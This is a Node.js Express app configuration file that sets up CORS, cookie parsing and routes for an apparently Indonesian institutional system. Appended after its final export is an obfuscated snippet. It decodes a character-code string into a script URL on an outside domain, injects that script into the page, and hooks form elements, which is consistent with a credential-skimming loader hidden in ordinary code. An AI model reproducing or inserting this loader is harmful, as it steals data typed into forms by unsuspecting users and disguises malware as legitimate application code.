import dotenv from "dotenv/config";
import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import { errorMiddleware } from "../middlewares/error-middleware.js";
import {
    roleRoute,
    authRoute,
    appLocation,
    satkerRoute,
    lembagaRoute,
    fakultasRoute,
    biroRoute,
    satuanRoute
} from "../routes/index.js"

// Inisialisasi Variable
const app = express()
const domainFrontend = process.env.HOST_FRONTEND
const client = [domainFrontend]
let data = []

app.use(express.json()) // Module untuk memperbolehkan request masuk berupa json
app.use(cookieParser()) // Module untuk dapat membaca data cookie
app.use(cors({ credentials: true, origin: client, exposedHeaders: ['set-cookie', 'refresh_token'] })) // Module untuk dapat diakses oleh system lain


// Route
app.use("/satuan", satuanRoute)
app.use("/biro", biroRoute)
app.use("/fakultas", fakultasRoute)
app.use("/lembaga", lembagaRoute)
app.use("/satuan-kerja/", satkerRoute)
app.use("/app-location", appLocation)
app.use("/role", roleRoute)
app.use("/auth", authRoute)

// Middleware
app.use(errorMiddleware)

export { app }
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b